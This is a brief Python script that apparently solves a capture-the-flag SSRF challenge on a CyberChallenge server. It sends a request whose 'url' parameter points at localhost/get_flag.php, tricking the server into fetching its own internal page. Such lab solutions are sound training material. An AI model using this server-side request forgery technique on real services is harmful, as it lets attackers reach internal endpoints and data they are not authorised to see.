import requests
from urllib.parse import quote

url = 'http://ssrf1.challs.cyberchallenge.it/'
params = {
        'url' : 'http://localhost/get_flag.php'
        } 
resp = requests.get(url, params=params)
print(resp.text)